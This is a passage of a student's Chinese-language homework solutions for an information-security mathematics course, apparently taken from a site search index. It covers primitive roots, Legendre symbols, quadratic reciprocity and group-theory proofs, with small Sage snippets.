\u0026lt; 60$$，若 4 不是 11 的次数，这与 2 是一个原根矛盾。\n因此我们得到了两个次数为 4 的整数 11、50。\n然后我们证明它的唯二性，若 $$\\exist p \\not\\equiv \\pm 11 \\pmod{61}, ord(p) = 4$$\n必有 $$p^4 \\equiv 11^4 \\pmod{61} \\Leftrightarrow (p^2 +11^2)(p^2 - 11^2) \\equiv 0 \\pmod{61}$$\n因为我们的假设，必有 $$p^2 + 11^2 \\equiv 0 \\pmod{61} \\Leftrightarrow p^2 \\equiv 1 \\pmod{61}$$\n存在一个 4 的因子 2 使得次数定义式成立，这与 4 是 p 的次数矛盾。\n因此 11 与 50 是唯二的次数为 4 的整数。\n4 #  根据下面的定理：\n 设 m 是大于 1 的整数，则 m 的原根存在的充要条件是 m 为 $$2, 4, p^l, 2p^l$$ 之一，其中 $$l \\ge 1,$$ p 是奇素数。\n 我们通过一下的程序分解这三个数字：\n#!/usr/bin/env sage print(factor(47), factor(55), factor(59)) # (47, 5 * 11, 59) 根据定理可知，仅 55 不满足原根存在的充要条件，47 与 59 都是奇素数。\n对于 47：$$\\phi(47) = 46 = 2*23, 5^2 \\equiv 4 \\not\\equiv 1 \\pmod{47}, 5^{23} \\equiv 46 \\not\\equiv 1 \\pmod{47}$$，因此我们得到了 47 的一个原根 5，因此根据以下的程序可以计算出所有的原根：\n#!/usr/bin/env python2 from sage.all import * class PrimitiveRoot: def __init__(self, integer): self.R = IntegerModRing(integer) self.phi = euler_phi(self.R.order()) self.root = self.R(primitive_root(self.R.order())) def get_roots(self): self.roots = [] for i in range(euler_phi(self.phi)): if gcd(i, self.phi) == 1: self.roots.append(self.root ** i) return sorted(self.roots) def solve(): PR = PrimitiveRoot(47) print(PR.get_roots()) # [5, 10, 11, 13, 15, 23, 31, 38, 40, 41, 43] 同样我们可以得到：59 的所有原根：\n[2, 8, 10, 11, 14, 23, 32, 33, 40, 42, 44, 47, 50, 56]\n5 #  #!/usr/bin/env sage print(primitive_root(113)) # 3 6 #  指数表：\n#!/usr/bin/env sage N = 19 R = IntegerModRing(N) R(primitive_root(N)).powers(euler_phi(N)) # [1, 2, 4, 8, 16, 13, 7, 14, 9, 18, 17, 15, 11, 3, 6, 12, 5, 10] 对于 $$8 x^4 \\equiv 3 \\pmod{19}$$\n#!/usr/bin/env sage solve_mod([8 * x**4 == 3], 19) # [(5,), (14,)] 另外也可以，计算 8 的模 19 逆元 12，有等式 $$x^4 \\equiv 17 \\pmod{19}$$，取离散对数 $$ind_2 x^4 \\equiv ind_2 17 \\pmod{18} \\Rightarrow 2ind_2 x \\equiv 5 \\pmod{9}$$，显然我们得到 $$\\pm 5$$\n对于 $$5 x^3 \\equiv 2 \\pmod{19}$$\n#!/usr/bin/env sage solve_mod([5 * x **3 == 2], 19) # [(2,), (3,), (14,)] 另外，计算 5 关于模 19 的逆元 4，有等式 $$x^3 \\equiv 8 \\pmod{19} \\Rightarrow 3 ind_2 x \\equiv ind_2 8 \\pmod{18} \\Rightarrow ind_2 x \\equiv 1 \\pmod{6}$$，得到三个解 2,3,14\n对于 $$x^7 \\equiv 1 \\pmod{19}$$\n#!/usr/bin/env sage solve_mod([x ** 7 == 1], 19) # [(1,)] $$x^7 \\equiv 1 \\pmod{19} \\Rightarrow 7 ind_2 x \\equiv \\phi(19) \\pmod{\\phi(19)} \\Rightarrow x = 1 \\pmod{19}$$\n7 #  #!/usr/bin/env sage solve_mod([x**22 == 5], 41) # [(6,), (35,)] 证明题 #  1 #  令 $$x = ord_m a, y = ord_m b$$，显然我们有 $$a^x \\equiv b^y \\equiv 1 \\pmod{m}$$\n不是一般性我们设 $$x \\ge y$$，那么 $$a^x b^y \\equiv a^{x-y} (ab)^y \\equiv 1 \\pmod{m}$$\n根据 $$ab \\equiv 1 \\pmod{m}$$，我们可以得到 $$a^{x-y} \\equiv 1 \\pmod{m}$$\n很显然若 x-y 是一个比 x 更小且不为 1 的正整数，这与 x 为 a 的次数条件相悖。\n只有可能 x=y，亦即 $$ord_m a = ord_m b$$\n2 #  对于 $$a^s$$，我们有 $$(a^{s})^t = a^{st} \\equiv 1 \\pmod{m}$$\n然后我们证明 t 的最小性，我们知道 $$\\forall k \u0026lt; t$$ 若满足 $$(a^s)^k \\equiv 1\\pmod{m}$$，必有存在这样的 $$ks \u0026lt; st$$，$$a^{ks} \\equiv 1 \\pmod{m}$$，这与 st 是次数相悖。所以 t 是最小的。\n即 t 就是 $$a^s$$ 的次数。\n3 #  $$g^k$$ 是 m 的原根$$\\Leftrightarrow (g^k)^{\\phi(m)} \\equiv 1 \\pmod{m}$$ 且 $$(g^k)^{t} \\not\\equiv 1 \\pmod{m}, t \u0026lt; \\phi(m)$$\n对于 $$\\forall t \u0026lt; \\phi(m)$$，若 $$g^t \\equiv 1 \\pmod{m}$$，那么必然有 $$g^{kt} \\equiv 1 \\pmod{m}$$，这与之前的论证是矛盾的，因此必然有 g 也是一个原根。\n4 #  令 $$x = ord_m a, y = ord_m b$$，显然我们有 $$a^x \\equiv b^y \\equiv 1 \\pmod{m}$$\n那么 $$a^{xy} \\equiv b^{xy} \\equiv 1 \\pmod{m} \\Rightarrow (ab)^{xy} \\equiv 1 \\pmod{m}$$\n下面证明 xy 的最小性：\n设 $$\\exist m \u0026lt; xy, (ab)^m \\equiv 1 \\pmod{m}$$，那么必有 $$m | xy$$。\n因为 $$gcd(x, y) = 1$$，那么 m 必然是 x、y 的因子或其本身；\n因为 x、y 分别是 a、b 的次数，所以一定不存在一个因子满足幂余一的性质；\n又因为 $$gcd(x, y) = 1$$，x、y 的因子必然彼此互素；\n因此不存在这样的 m，所以 xy 的最小性得证。\n5 #  根据下面的定理：\n 设 m 是大于 1 的整数，则 m 的原根存在的充要条件是 m 为 $$2, 4, p^l, 2p^l$$ 之一，其中 $$l \\ge 1,$$ p 是奇素数。\n 对 12 进行素因子分解 $$12 = 2^2 * 3$$，很显然并不存在原根。\n6 #  设 $$k = ord_{F_n}(2)$$，即证明 $$k \\le 2^{n+1}$$\n因为我们发现 $$2^{2^{n+1}} = 2^{2^{n} * 2} \\equiv 1^2 \\equiv 1 \\pmod{2^{2^{n}} + 1}$$\n因此 k 一定是 $$2^{n+1}$$ 或者其因子，即一定有 $$k \\le 2^{n+1}$$\n7 #  （1）\n首先我们有 $$2^{2^{n+1}} = 2^{2^{n} * 2} \\equiv 1^2 \\equiv 1 \\pmod{2^{2^{n}} + 1}$$\n因为 $$p | 2^{2^{n}} + 1$$，所以我们必然有 $$2^{2^{n+1}} \\equiv 1 \\pmod{p}$$\n然后我们证明其最小性，因为我们有上面的等式 $$ord_p (2)$$ 一定是 $$2^{n+1}$$ 或其因子，而后者的因子仅有 $$2^t, t \\le n+1 $$\n$$(2^{2^t})^{2^{n-t}} \\equiv 2^{2^{n}} \\equiv -1 \\pmod{2^{2^n} + 1} \\Rightarrow (2^{2^t})^{2^{n-t}} \\equiv -1 \\pmod{p} $$\n而如果 $$2^t$$ 是一个原根的话，那么必然会有 $$2^{2^t} \\equiv 1 \\pmod{p} \\Rightarrow (2^{2^t})^{2^{n-t}} \\equiv 1 \\pmod{p} $$\n以上两点是矛盾的，因此 $$2^t$$ 不可能是一个原根。\n（2）\np 形如 $$2^{n+1} k + 1 \\Leftrightarrow p \\equiv 1 \\pmod{2^{n+1}}$$\n因为 p 是奇素数，我们又有 $$2^{p-1} \\equiv 1 \\pmod{p}$$\n而又根据第一问我们有 $$ord_p (2) = 2^{n+1}$$，所以我们必然有 $$2^{n+1} | (p-1)$$\n即必然有 $$p-1 \\equiv 0 \\pmod{2^{n+1}} \\Rightarrow p \\equiv 1\\pmod{2^{n+1}}$$\n8 #  p 以 g 为原根 $$\\Rightarrow g^{\\phi(p)} \\equiv 1 \\pmod{p}$$ 且 $$g^{t} \\not\\equiv 1 \\pmod{p}, t \u0026lt; \\phi(p)$$\n而因为 p 是奇素数，所以很显然我们有 $$\\phi(p) = p -1$$\n所以我们知道 $$g^{\\frac{p-1}{2}} \\equiv 1^{\\frac{1}{2}} \\pmod{p}$$\n而对于 p-1，恰好满足 $$(p-1)^2 = p^2 -2p + 1 \\equiv 1 \\pmod{p}$$\n所以 $$\\displaystyle g^{\\frac{p-1}{2}} \\equiv p - 1 \\pmod{p} \\Rightarrow ind_g (p-1) = \\frac{p-1}{2}$$\n"},{"id":100,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/homework/3.2/","title":"3.2","section":"HOMEWORK","content":"3.2 #  解答题 #  1 #  直接通过 sage 计算：\n#!/usr/bin/env sage print(kronecker(2, 29)) # -1 另外，可以具体过程为：\n对于勒让德符号 $$\\displaystyle (\\frac{a}{p}) = (\\frac{2}{29})$$，根据欧拉判别条件 $$\\displaystyle (\\frac{2}{29}) = 2^{\\frac{28}{2}} \\equiv 32^2 * 16 \\equiv 9 * 16 \\equiv 144 \\equiv -1 \\pmod{29}$$\n或者 $$p \\equiv -3 \\pmod{8}$$，因此 $$\\displaystyle (\\frac{2}{29}) = -1$$\n所以 2 不为 29 的二次剩余。\n2 #  -1 是模 p 的二次剩余 $$\\displaystyle \\Leftrightarrow (\\frac{-1}{p}) = 1​$$\n对于左侧勒让德符号 $$\\displaystyle (\\frac{-1}{p}) = (-1)^{\\frac{p-1}{2}} = \\begin{cases} 1 \u0026amp; \\text{若 } p \\equiv 1 \\pmod{4} \\ -1 \u0026amp; \\text{若 } p \\equiv 3\\pmod{4}\\end{cases}$$\n所以 -1 是模 p 的二次剩余的一个充要条件是 $$p \\equiv 1 \\pmod{4}$$\n3 #  #!/usr/bin/env sage print(kronecker(191, 397)) # 1 这说明 191 对 397 的勒让德符号为 1，说明 191 是 397 的二次剩余。即方程有解。\n#!/usr/bin/env sage solve_mod(x**2 == 191, 397) # [(117,), (280,)] 另外，手算可以使用二次互反律：\n首先：\n#!/usr/bin/env sage is_prime(191), is_prime(397) # True, True $$\\displaystyle (\\frac{191}{397})(\\frac{397}{191}) = (-1)^{95 * 198} = 1 \\Leftrightarrow (\\frac{191}{397}) = 1*(\\frac{15}{191})​$$\n对于 15 对模 191 的勒让德符号：$$\\displaystyle (\\frac{15}{191}) = (\\frac{3}{191})(\\frac{5}{191}) = (-1)^{195}(\\frac{191}{3})(-1)^{295}(\\frac{191}{5}) = -1*(\\frac{2}{3})* 1 *(\\frac{1}{5})$$\n而我们有 $$\\displaystyle (\\frac{2}{3}) = 2^{\\frac{3-1}{2}} = -1, (\\frac{1}{5}) = 1$$\n因而对于原式：$$\\displaystyle (\\frac{191}{397}) = 1*(-1)*1*(-1)*1 = 1​$$\n4 #  #!/usr/bin/env sage print(kronecker(11, 511)) # -1 这说明 11 对 511 的雅可比符号为 -1，说明 11 是 511 的二次非剩余。即方程无解。\n另外，也可以使用二次互反律：\n首先：\n#!/usr/bin/env sage factor(511) # 7 * 73 $$\\displaystyle (\\frac{11}{511}) = (\\frac{11}{7})(\\frac{11}{73})$$\n对于前者 $$\\displaystyle (\\frac{3}{7}) =3^{\\frac{7 - 1}{2}} \\equiv 3^3 \\equiv -1 \\pmod{7}$$\n对于后者 $$\\displaystyle (\\frac{11}{73}) = (-1)^{\\frac{11 - 1}{2} \\frac{73-1}{2}} (\\frac{73}{11}) = (\\frac{-2}{11}) = (-2)^{5} = -32 \\equiv 1 \\pmod{11}​$$\n所以综上，$$\\displaystyle (\\frac{11}{511}) = -1$$，因此 11 是 511 的二次非剩余。方程无解。\n5 #  #!/usr/bin/env sage print(kronecker(2, 73)) # 1 这说明 2 对 73 的勒让德符号为 1，说明 2 是 73 的二次剩余。即方程有解。\n#!/usr/bin/env sage solve_mod(x**2 == 2, 73) # [(32,), (41,)] 另外，对于笔算方法。首先：\n#!/usr/bin/env sage print(is_prime(73)) # True print(73 % 8) # 1 $$\\displaystyle 73 \\equiv 1 \\pmod{8} \\Rightarrow (\\frac{2}{73}) = 1$$\n6 #  即方程 $$n^2 \\equiv 3 \\pmod{313}$$ 是否有解，这等价于求 3 是否为模 313 的二次剩余。\n#!/usr/bin/env sage kronecker(3, 313) # 1 这表示 3 确实为 313 的二次剩余。\n另外也可以：$$\\displaystyle (\\frac{3}{313}) = (-1)^{1*156} (\\frac{313}{3}) = (\\frac{1}{3}) = 1$$\n7 #  （1）$$\\displaystyle (\\frac{17}{37}) = (-1)^{818}(\\frac{3}{17}) =(-1)^{18} \\frac{2}{3} = -1$$\n（2）$$\\displaystyle (\\frac{151}{373}) = (-1)^{75186}(\\frac{71}{151}) = (-1)^{3575} (\\frac{9}{71}) = -(\\frac{3^2}{71}) = -1​$$\n（3）$$\\displaystyle (\\frac{191}{397}) = (-1)^{95198} (\\frac{15}{191}) = (\\frac{3}{191})(\\frac{5}{191}) = (-1)^{195}(\\frac{2}{3})(-1)^{2*95}(\\frac{1}{5}) = 1$$\n（4）$$\\displaystyle (\\frac{911}{2003}) = (-1)^{4551001} (\\frac{181}{911}) = -(-1)^{90455}(\\frac{6}{181}) = -(\\frac{2}{181})(-1)^{1*90}(\\frac{1}{3})$$\n注意到 $$181 \\equiv -3 \\pmod{8}$$，因此 $$\\displaystyle (\\frac{911}{2003}) = 1$$\n（5）首先：\n#!/usr/bin/env sage is_prime(37), is_prime(20040803) # (True, True) $$\\displaystyle (\\frac{37}{20040803}) = (-1)^{18k} (\\frac{12}{37}) = (\\frac{3}{37})(\\frac{2^2}{37}) = (-1)^{118} (\\frac{1}{3}) = 1$$\n8 #  设 x 以 5 为二次剩余，亦即 $$\\displaystyle (\\frac{5}{x}) = 1$$\n$$\\displaystyle (\\frac{5}{x}) = (-1)^{2*k} (\\frac{x}{5}) = (\\frac{x}{5})$$\n穷举 0 到 4 即可以得到解：$$x \\in {k \\equiv 1, 2, 4 \\pmod{5}, k \\in \\mathbb{Z}}​$$\n9 #  #!/usr/bin/env sage x, y = var(\u0026#39;x\u0026#39;), var(\u0026#39;y\u0026#39;) len(solve_mod([x**3 - 3*x + 10 == y**2], 23)) # 17 不会不解方程的做法。\n10 #  （1）$$\\displaystyle (\\frac{51}{71}) = (\\frac{3}{71}) (\\frac{17}{71}) = (-1)^{135} (\\frac{2}{3}) * (-1)^{835} (\\frac{3}{17}) = (-1)^{1*8} (\\frac{2}{3}) = -1$$\n（2）$$\\displaystyle (\\frac{35}{97}) = (\\frac{5}{97})(\\frac{7}{97}) = (-1)^{248} (\\frac{2}{5})(-1)^{3*48}(\\frac{6}{7}) = (-1) * (-1) = 1$$\n（3）$$\\displaystyle (\\frac{313}{401}) = (-1)^{156 * 200} (\\frac{88}{313}) = (\\frac{11}{313}) (\\frac{2}{313}) (\\frac{2^2}{313}) = (-1)^{5*156} (\\frac{5}{11}) = (\\frac{1}{5}) = 1$$\n（4）$$\\displaystyle (\\frac{165}{503}) = (\\frac{3}{503}) (\\frac{5}{503}) (\\frac{11}{503}) = (-1)^{1251} (\\frac{2}{3}) * (-1)^{2251}(\\frac{3}{5}) * (-1)^{3*251} (\\frac{8}{11})$$\n$$\\displaystyle = 1 * (-1) * (-1) (\\frac{2^2}{11})(\\frac{2}{11}) = -1$$\n证明题 #  1 #  充分性：\n若 $$x^2 \\equiv 3 \\pmod{p}​$$ 有解，即 3 为模 p 的二次剩余，即 $$\\displaystyle (\\frac{3}{p}) = 1​$$\n$$\\displaystyle (\\frac{3}{p}) = 1 \\Leftrightarrow (-1)^{1 * \\frac{p - 1}{2}} (\\frac{p}{3}) = 1 \\Leftrightarrow$$\n$$\\displaystyle \\big(p \\equiv 1 \\pmod{4} 且 p \\equiv 1 \\pmod{3}\\big) 或 \\big(p \\equiv 3 \\pmod{4} 且 p \\equiv 2 \\pmod{3}\\big)$$\n应用中国剩余定理：$$\\Leftrightarrow p \\equiv 1 \\pmod{12} 或 p \\equiv 11 \\pmod{12}$$\n$$\\Leftrightarrow p \\equiv \\pm 1 \\pmod{12}$$\n必要性：\n因为在进行充分性推导时的每一步都是等价的，因此也是必要条件。\n2 #  5 是模 p 的二次剩余 $$\\displaystyle \\Leftrightarrow (\\frac{5}{p}) = 1 \\Leftrightarrow (\\frac{p}{5}) = 1 \\Leftrightarrow \\exist x, x^2 \\equiv p \\pmod{5}​$$\n因为我们有 $$p \\equiv 1 \\pmod{5}$$，显然存在 x=1，使得上式成立，因此得证。\n3 #  考虑分解勒让德符号：\n$$\\displaystyle (\\frac{b}{p}) + (\\frac{2b}{p}) + \\cdots + (\\frac{(p-1)b}{p}) = (\\frac{b}{p}) \\sum_{i = 1}^{p - 1} (\\frac{i}{p})$$\n对于后面的加和，因为\n 设 p 是奇素数，则模 p 的缩系中二次剩余与非二次剩余的个数各为 $$\\displaystyle \\frac{p - 1}{2}$$，且 $$\\displaystyle \\frac{p - 1}{2}$$ 个二次剩余分别与序列 $$\\displaystyle 1^2, 2^2, \\cdots, (\\frac{p - 1}{2})^2$$ 中的一个数同余，且仅与一个数同余。\n 所以 $$\\displaystyle \\sum_{i = 1}^{p-1} (\\frac{i}{p}) = 0$$，所以初式为 0。\n4 #  $$\\displaystyle (\\frac{-3}{p}) = (\\frac{-1}{p})(\\frac{3}{p}) = (-1)^{\\frac{p - 1}{2}}(-1)^{1*\\frac{p-1}{2}} (\\frac{p}{3}) = \\frac{p}{3} =\\begin{cases} 1 \u0026amp; p \\equiv 1 \\pmod{3} \\ -1 \u0026amp; p \\equiv 2 \\pmod{3}\\end{cases}$$\n考虑到 p 是奇数，即 $$p \\equiv 1 \\pmod{2}$$\n所以根据中国剩余定理：$$\\displaystyle (\\frac{-3}{p}) = \\begin{cases} 1 \u0026amp; p \\equiv 1 \\pmod{6} \\ -1 \u0026amp; p \\equiv -1 \\pmod{6}\\end{cases}$$\n5 #  我们知道以下的结论：\n 我们知道 1,4 必然是 p 的二次剩余； 其次我们知道 $$\\displaystyle (\\frac{6}{p}) = (\\frac{2}{p})(\\frac{3}{p})$$，则 6,2,3 三个数中必然有一个是二次剩余；  则以下三对必然有一个均为二次剩余：\n 1 与 3，2 与 4，4 与 6  "},{"id":101,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/homework/4.1/","title":"4.1","section":"HOMEWORK","content":"4.1 群 #  证明题 #  1 #  （1）\n这个运算是交换的：\n $$n * m = -m - n = -n -m = n*m$$  但是这个运算不是结合的\n $$(a * b) * c = -(a*b) -c = a + b - c$$ $$a * (b * c) = -a - (b * c) = -a + b + c$$  （2）\n这个运算在整数集上是封闭的：\n $$\\forall a, b \\in \\mathbb{Z}, a * b = a + b -2 \\in \\mathbb{Z}$$  这个运算是结合的：\n $$\\forall a, b, c \\in \\mathbb{Z}, (a * b) * c = (a + b - 2) + c - 2 = a + (b + c - 2) -2 = a*(b*c)$$  这个代数系统中存在幺元：\n $$\\exist e = 2 \\in \\mathbb{Z}, \\forall a \\in \\mathbb{Z}, 2 * a = a * 2 = a + 2 - 2 = a$$  这个整数集中的每个元素在这个代数系统中都存在逆元：\n $$\\forall a \\in \\mathbb{Z}, \\exist (4 - a) \\in \\mathbb{Z}, a * (4 - a) = a + 4 -a - 2 = 2 = e$$  所以这个代数系统是一个群。\n2 #  这个运算在 G 内是封闭的；\n这个运算在 G 上满足结合律；\n这个代数系统中存在幺元：\n 任意元素都存在幺元：  $$\\forall a, a_i, a_j \\in G$$，有消去率：$$a\\cdot a_i = a \\cdot a_j \\Leftrightarrow a_i = a_j$$，因为 G 是有限群，设 $$G = {a_0, a_1, \\cdots, a_{n-1}}$$ 则 $${a\\cdot a_0, a \\cdot a_1, \\cdots, a \\cdot a_{n-1}}$$ 两两不相同且因为运算封闭均在 G 中，而又与 G 的势相同，因此总有 $${a\\cdot a_0, a \\cdot a_1, \\cdots, a \\cdot a_{n-1}} = G = {a_0, a_1, \\cdots, a_{n-1}}$$。 所以总存在这样的 t，$$a \\cdot a_t = a$$，即 $$a_t$$ 为这个代数系统的幺元。   $$e = a_t$$ 为 G 中所有元素的幺元：  对于 $$e = a_t$$，若 $$\\exist a_i \\in G, e \\cdot a_i \\not= a_i$$， 那么根据前面的讨论总有 $$\\exist a_j \\in G, a_i = a \\cdot a_j \\Rightarrow e \\cdot a \\cdot a_j \\not= a \\cdot a_j$$，这很显然是矛盾的 所以 $$\\forall a_i \\in G, e \\cdot a_i = a_i$$    这个集合 G 中的每个元素在这个代数系统中都存在逆元：\n 同样的，我们有 $${a\\cdot a_0, a \\cdot a_1, \\cdots, a \\cdot a_{n-1}} = G = {a_0, a_1, \\cdots, a_{n-1}}$$ 因为 $$e \\in G$$，所以$$\\forall a \\in G, \\exist a_t \\in G, a \\cdot a_t = e$$，其中即有 $$a_t = a^{-1}$$  所以这个代数系统是一个群\n3 #  这个代数系统是封闭的：\n 因为 $$(G_1, +_1), (G_2, +_2)$$ 是群，因此 $$x_1 +_1 x_2 \\in G_1, y_1 +_2 y_2 \\in G_2$$，所以 $$(x_1, y_1) + (x_2, y_2) \\in G$$，即 + 在集合 G 上是封闭的  这个代数系统是结合的：\n 考虑 $$(x_1, y_1), (x_2, y_2), (x_3, y_3) \\in G$$ $$((x_1, y_1) + (x_2, y_2)) + (x_3, y_3) = (x_1 +_1 x_2, y_1 +_2 y_2) + (x_3, y_3) = ((x_1 +_1 x_2) +_1 x_3, (y_1 +_2 y_2) +_2 y_3)$$ $$(x_1, y_1) + ((x_2, y_2) + (x_3, y_3)) = (x_1, y_1) + (x_2 +_1 x_3, y_2 +_2 y_3) = (x_1 +_1 (x_2 +_1 x_3), y_1 +_2 (y_2 +_2 y_3))$$ 又由于 $$(G_1, +_1), (G_2, +_2)$$ 是群，也就满足结合率，所以上两式相等。即 + 在 G 上是结合的。  这个代数系统中存在幺元：\n  设群 $$(G_1, +_1), (G_2, +_2)$$ 的幺元分别为 $$e_1, e_2$$，考虑 $$e = (e_1, e_2) \\in G$$\n  $$\\forall (x, y) \\in G \\Rightarrow (x, y) + (e_1, e_2) = (x +_1 e_1, y +_2 e_2) = (x, y)$$，所以 $$e = (e_1, e_2)$$ 即为代数系统 $$(G, +)$$ 的幺元。\n  这个集合 G 中的每个元素在这个代数系统中都存在逆元：\n 由于 $$(G_1, +_1), (G_2, +_2)$$ 是群，其内任意元素都存在逆元 $$\\forall (x, y) \\in G \\Rightarrow (x,y) + (x^{-1}, y^{-1}) = (x +_1 x^{-1}, y +_2 y^{-1}) = (e_1, e_2) = e \\Rightarrow (x,y)^{-1} = (x^{-1}, y^{-1})$$。即任意 G 中的元素都存在逆元  所以这个代数系统是一个群。\n4 #  设这个群为 $$(G, *)$$，其幺元为 e，考虑 $$\\forall a,b \\in G$$，有：\n  任意非幺元阶为 2，且 e 恒有 $$e * e = e$$，所以 $$\\forall x \\in G, x * x = e$$\n  $$\\displaystyle e = e \\overset{x*x = e}{\\Leftrightarrow} (a * b) * (a * b) = (a * a) * (b * b)$$\n$$\\overset{存在逆元}{\\Leftrightarrow} a^{-1}(a * b * a * b) * b^{-1} = a^{-1}(a * a * b * b) * b^{-1} \\overset{满足结合率}{\\Leftrightarrow} b * a = a * b$$\n  所以这个群满足交换率，所以这个群是阿贝尔群。\n5 #  （1）\n运算是封闭的：\n 对于 $$G_1, G_2 \\in 2^S, G_1, G_2 \\sub S, \\Rightarrow \\forall a_1 \\in G_1, a_2 \\in G_2, a_1,a_2 \\in S$$ 所以 $$\\forall x \\in G_1 \\cup G_2, y \\in G_1 \\cap G_2, x, y \\in S \\Rightarrow G_1 \\cup G_2, G_1 \\cap G_2 \\sub S$$，即交并运算在 $$2^S$$ 上都是封闭的  运算是结合的：\n 对于 $$G_1, G_2, G_3 \\in 2^S$$，很显然，交并运算对于集合是结合的。  所以 $$(2^S, \\cup), (2^S, \\cap)$$ 显然都是半群。\n（2）\n这个代数系统是封闭的：\n $$\\forall x \\in (A \\text{\\} B) \\cup (B \\text{\\} A)$$，必然有 $$x \\in A \\cup B$$，所以 $$A \\Delta B \\in 2^S$$，即这个运算在 $$2^S$$ 上是封闭的。  这个代数系统是结合的：\n 对于 $$\\forall A, B, C \\in 2^S$$ $$\\displaystyle (A \\Delta B) \\Delta C = (( (A \\text{\\} B) \\cup (B \\text{\\} A) ) \\text{\\} C) \\cup (C \\text{\\} ((A \\text{\\} B) \\cup (B \\text{\\} A))) = (A \\text{\\} B \\text{\\} C) \\cup (B \\text{\\} A \\text{\\} C) \\cup ( C \\text{\\} B \\text{\\} A) \\cup (A \\cap B \\cap C)$$ $$A \\Delta( B \\Delta C) = (A \\text{\\} ((B \\text{\\} C) \\cup (C \\text{\\} B))) \\cup (((B \\text{\\} C) \\cup (C \\text{\\} B)) \\text{\\} A) = (A\\text{\\}B \\text{\\} C) \\cup (A \\cap B \\cap C) \\cup (B \\text{\\}C \\text{\\} A)\\cup (C \\text{\\}B \\text{\\} A)$$ 我们考虑差运算总有 $$G_1 \\text{\\} G_2 \\text{\\} G_3 = G_1 \\text{\\} G_3 \\text{\\} G_2$$，所以上两式是相等的，因此这个代数系统满足结合律。  这个代数系统中存在幺元：\n 存在 $$E = \\varnothing$$，$$\\forall G \\in 2^S, G \\Delta E = (\\varnothing \\text{\\} G) \\cup (G \\text{\\} \\varnothing) = G$$，即 E 为这个代数系G 中统中的幺元。  这个集合中的每个元素在这个代数系统中都存在逆元：\n 我们知道：$$A \\text{\\} B = \\varnothing \\Leftrightarrow A \\sub B$$，$$A \\cup B = \\varnothing \\Leftrightarrow A = \\varnothing \\and B = \\varnothing$$ 有 $$\\forall G \\in 2^S, G' \\Delta G = (G' \\text{\\} G) \\cup (G \\text{\\} G')= \\varnothing \\Leftrightarrow (G \\sub G') \\and (G' \\sub G) \\Leftrightarrow G' = G$$，也就是说，任意的 G，在这个代数系统中都存在唯一的逆元 G  所以 $$(2^S, \\Delta)$$ 是一个群。\n6 #  （1）\n考虑 $$cab = c(ab) = c = (ca)b = b \\Rightarrow b = c$$\n因此 $$b = c = a^{-1}$$\n（2）\n充分性：\n $$b = a^{-1} \\Rightarrow aba = a(ba) = a$$ $$b = a^{-1} \\Rightarrow ab^2a = (ab)(ba) = e$$  必要性：\n $$e = a a^{-1}= abaa^{-1} = ab = a^{-1}a = a^{-1}aba = ba \\Rightarrow ab = ba = e \\Rightarrow b = a^{-1}$$ 考虑 $$(\\mathbb{Z}_3, +), a = 1, b = 1, a+ b + b + a = 1 \\not=0$$，后者并不是必要条件  （3）\n充分性是很显然的。下证必要性：\n因为 G 是 M 的子集，二元运算在 G 上满足结合律，必然在 M 上满足结合律。\n这个代数系统存在幺元：\n  令 $$g_1 = g_2$$，由于 G 中的每个元素都是可逆的 $$g_1^{-1} g_2 = e \\in G$$\n  因为 G 是 M 的子集，所以 M 的幺元必是 G 的幺元，所以这个代数系统存在幺元\n  这个代数系统中每个元素都存在逆元：\n 令 $$g_2 = e$$，我们有 $$\\forall g_1 \\in G, g_1^{-1} \\in G$$  这个代数系统是封闭的：\n 对于 $$\\forall g_1, g_2 \\in G \\Rightarrow g_1^{-1} \\in G$$，因此我们有 $$(g_1^{-1})^{-1} g_2 = g_1 g_2 \\in G$$  所以这个代数系统是一个群。\n（4）\n对于 G 中所有的可逆元素构成的集合，对于二元运算必然有结合律、存在幺元、存在逆元。下证封闭性：\n $$\\forall g_1, g_2, g_1g_2 \\in G$$，考虑 $$g_1g_2$$ 的逆元，$$\\exist g_2^{-1}g_1^{-1} \\in G, (g_1g_2)(g_2^{-1}g_1^{-1}) = e$$ 因此 $$g_1g_2$$ 是可逆的，即这个代数系统也是封闭的  所以这个代数系统是一个群\n7 #  充分性是很显然的。下证必要性：\n因为 H 是 G 的子集，且 $$(G, \\cdot)$$ 是一个群，所以 $$(H, \\cdot)$$ 必然满足结合律。\n因为 $$\\forall a, b \\in H, a \\cdot b \\in H$$，所以代数系统是封闭的。\n代数系统中存在幺元：b\n 因为 H 是一个有限集，设其势为 n，考虑序列 $${a, a^2, \\cdots,a^n, a^{n+1}}$$ 考虑到代数系统是封闭的，因此序列中的每一个元素都在 H 中，然而序列长度为 n+1，所以必然 $$\\exist i,j (i \u0026gt; j), a^i = a^j \\Rightarrow a^i = a^j \\cdot a^{i - j}$$，在集合 G 中考虑这个等式有 $$a^{i - j} =e$$。 所以 $$e \\in H$$，G 的幺元必是 H 的幺元，所以代数系统中存在幺元  集合 H 中每个元素在二元运算下都存在属于 H 的逆元：\n 根据上面的证明，我们得到了 $$a^{i - j} = e$$，于是有 $$a \\cdot (a^{i -j -1}) = e, a^{-1} = a^{i-j-1}$$，因为后者是 a 通过与自身进行有限次二元运算得到的，考虑到代数系统是封闭的，所以 $$a^{-1} = a^{i-j-1} \\in H$$  所以这个有限子集与二元运算构成的代数系统必然是群，也就是必然是一个子群。\n8 #  考虑循环群 $$(\\mathbb{Z}, +)$$，其生成元为 1。$$(H, +)$$ 作为循环群的子群，必然也是循环群。\n设后者生成元为 a，则集合 H 可以表示为 $${\\cdots, a^{-2}, a^{-1} ,e, a, a^2, a^3, \\cdots}$$（此处幂次表示二元运算加法的累计，即有 $$a^i = i\\cdot a$$，点表示整数环意义上的乘法）\n因此对于 $$\\forall i \\in \\mathbb{Z}$$，令 $$m = a$$，我们有陪集 $$m\\mathbb{Z} = {m \\cdot i | i \\in \\mathbb{Z}} = {m^i | i \\in \\mathbb{Z}} = H$$\n9 #  对于群 $$(G, \\cdot)$$ 设两个真子集 A、B 全集为 G，因为 $$A \\cup B = G$$，所以必有 $$\\exist a \\in A, a \\not\\in B, \\exist b \\in B, b\\not\\in A$$\n考虑 $$a \\cdot b$$，因为 $$(G, \\cdot)$$ 是群，所以 